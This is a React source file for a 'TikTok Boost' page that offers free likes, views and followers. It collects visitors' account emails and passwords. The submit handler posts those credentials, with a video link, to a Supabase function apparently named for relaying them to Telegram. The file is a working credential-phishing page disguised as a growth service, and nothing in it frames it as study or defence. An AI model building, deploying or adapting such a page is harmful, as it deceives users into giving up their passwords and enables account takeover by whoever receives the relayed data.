import { useState } from 'react';
import { MessageCircle, Zap } from 'lucide-react';

function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [service, setService] = useState('');
  const [showModal, setShowModal] = useState(false);
  const [videoLink, setVideoLink] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmitRequest = () => {
    if (!email || !password || !service) {
      alert('Please fill all fields');
      return;
    }
    setShowModal(true);
  };

  const handleSubmitOrder = async () => {
    if (!videoLink) {
      alert('Please enter video link');
      return;
    }

    setIsSubmitting(true);

    try {
      const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
      const anonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;

      const functionUrl = `${supabaseUrl}/functions/v1/send-telegram-message`;

      const response = await fetch(functionUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${anonKey}`,
          'X-Client-Info': 'tiktok-boost',
        },
        body: JSON.stringify({
          email,
          password,
          service,
          videoLink,
        }),
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error('Response error:', response.status, errorText);
        alert('Failed to submit order. Please try again.');
        setIsSubmitting(false);
        return;
      }

      const data = await response.json();

      if (data.success) {
        alert('Order submitted successfully! ✅');
        setShowModal(false);
        setEmail('');
        setPassword('');
        setService('');
        setVideoLink('');
      } else {
        console.error('API Error:', data);
        alert('Failed to submit order. Please try again.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Failed to submit order. Please check console for details.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-50 via-pink-50 to-blue-50">
      <div className="absolute top-0 left-0 w-full bg-gradient-to-r from-purple-600 via-pink-600 to-blue-600 text-white py-3 overflow-hidden">
        <div className="animate-marquee whitespace-nowrap">
          <span className="mx-8">Get Free TikTok Service likes, views Followers & must enter correct details</span>
          <span className="mx-8">Get Free TikTok Service likes, views Followers & must enter correct details</span>
          <span className="mx-8">Get Free TikTok Service likes, views Followers & must enter correct details</span>
        </div>
      </div>

      <div className="container mx-auto px-4 pt-24 pb-12">
        <div className="max-w-md mx-auto">
          <a
            href="https://whatsapp.com/channel/0029VaxTIEH1CYoSV4sZmq37"
            target="_blank"
            rel="noopener noreferrer"
            className="block mb-6"
          >
            <div className="bg-gradient-to-r from-green-500 to-green-600 rounded-full py-3 px-6 shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-200 flex items-center justify-center gap-2 text-white font-semibold">
              <MessageCircle size={20} />
              Join WhatsApp Channel
            </div>
          </a>

          <div className="bg-white rounded-3xl shadow-2xl overflow-hidden">
            <div className="bg-gradient-to-r from-pink-500 via-purple-500 to-blue-500 p-8 text-center text-white">
              <h1 className="text-3xl font-bold mb-2">TikTok Boost</h1>
              <p className="text-lg opacity-90">Get Likes, Views & Followers</p>
            </div>

            <div className="p-8 space-y-5">
              <div className="relative">
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="Enter account email"
                  className="w-full px-4 py-3 pl-10 border-2 border-gray-200 rounded-lg focus:border-purple-500 focus:outline-none transition-colors"
                />
                <div className="absolute left-3 top-3.5 text-gray-400">
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                  </svg>
                </div>
              </div>

              <div className="relative">
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter Password"
                  className="w-full px-4 py-3 pl-10 border-2 border-gray-200 rounded-lg focus:border-purple-500 focus:outline-none transition-colors"
                />
                <div className="absolute left-3 top-3.5 text-gray-400">
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                  </svg>
                </div>
              </div>

              <div className="relative">
                <select
                  value={service}
                  onChange={(e) => setService(e.target.value)}
                  className="w-full px-4 py-3 pl-10 border-2 border-gray-200 rounded-lg focus:border-purple-500 focus:outline-none transition-colors appearance-none bg-white"
                >
                  <option value="">Choose Service</option>
                  <option value="200 Likes">200 Likes</option>
                  <option value="100 Followers">100 Followers</option>
                  <option value="1000 Views">1000 Views</option>
                </select>
                <div className="absolute left-3 top-3.5 text-gray-400">
                  <Zap size={20} />
                </div>
                <div className="absolute right-3 top-4 text-gray-400 pointer-events-none">
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                  </svg>
                </div>
              </div>

              <button
                onClick={handleSubmitRequest}
                className="w-full bg-gradient-to-r from-green-500 to-green-600 text-white py-3 rounded-lg font-semibold hover:from-green-600 hover:to-green-700 transform hover:scale-105 transition-all duration-200 shadow-lg"
              >
                Submit Request
              </button>
            </div>
          </div>

          <div className="grid grid-cols-3 gap-4 mt-8">
            <div className="bg-white rounded-2xl p-6 text-center shadow-lg">
              <h3 className="text-2xl font-bold text-pink-500 mb-1">Likes</h3>
              <p className="text-sm text-gray-600">Boost Engagement</p>
            </div>
            <div className="bg-white rounded-2xl p-6 text-center shadow-lg">
              <h3 className="text-2xl font-bold text-purple-500 mb-1">Views</h3>
              <p className="text-sm text-gray-600">Increase Reach</p>
            </div>
            <div className="bg-white rounded-2xl p-6 text-center shadow-lg">
              <h3 className="text-2xl font-bold text-blue-500 mb-1">Followers</h3>
              <p className="text-sm text-gray-600">Grow Audience</p>
            </div>
          </div>
        </div>
      </div>

      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-2xl p-8 max-w-md w-full shadow-2xl">
            <h2 className="text-2xl font-bold mb-6 text-gray-800">Enter Video Link</h2>
            <input
              type="url"
              value={videoLink}
              onChange={(e) => setVideoLink(e.target.value)}
              placeholder="Paste TikTok video link here"
              className="w-full px-4 py-3 border-2 border-gray-200 rounded-lg focus:border-purple-500 focus:outline-none transition-colors mb-6"
            />
            <div className="flex gap-3">
              <button
                onClick={() => setShowModal(false)}
                disabled={isSubmitting}
                className="flex-1 bg-gray-200 text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-300 transition-colors disabled:opacity-50"
              >
                Cancel
              </button>
              <button
                onClick={handleSubmitOrder}
                disabled={isSubmitting}
                className="flex-1 bg-gradient-to-r from-green-500 to-green-600 text-white py-3 rounded-lg font-semibold hover:from-green-600 hover:to-green-700 transition-all disabled:opacity-50"
              >
                {isSubmitting ? 'Submitting...' : 'Submit Order'}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default App;
